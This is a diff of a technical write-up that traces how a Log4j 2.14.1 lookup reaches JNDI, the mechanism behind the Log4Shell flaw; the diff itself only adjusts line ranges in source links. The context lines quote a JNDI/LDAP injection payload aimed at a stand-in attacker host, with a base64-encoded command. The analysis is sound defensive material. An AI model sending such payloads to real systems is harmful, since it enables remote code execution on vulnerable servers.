@@ -57,11 +57,11 @@ https://sourcegraph.com/github.com/apache/logging-log4j2@rel/2.14.1/-/blob/log4j
 
 Further down the call stack, we get into the interpolation logic, which selects a lookup method based on the prefix of the name stored in the argument `String var`, which is `jndi:ldap://malicious.com:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=`:
 
-https://sourcegraph.com/github.com/apache/logging-log4j2@4b789c8/-/blob/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.java?L212-239
+https://sourcegraph.com/github.com/apache/logging-log4j2@4b789c8/-/blob/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.java?L217-232
 
 The `jndi` prefix selects for the JNDI lookup, which brings us into the `JNDIManager` class:
 
-https://sourcegraph.com/github.com/apache/logging-log4j2@rel/2.14.1/-/blob/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java?L162-173
+https://sourcegraph.com/github.com/apache/logging-log4j2@rel/2.14.1/-/blob/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java?L171-173
 
 The value of the `String name` argument is `ldap://malicious.com:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=`. This method sits at the interface between Log4j and JNDI. In Log4j versions 2.14 and prior, it's the pretty short passthrough method shown above. In subsequent patched Log4j versions, however, the method has been significantly lengthened to include sanitization and filtering steps:
 
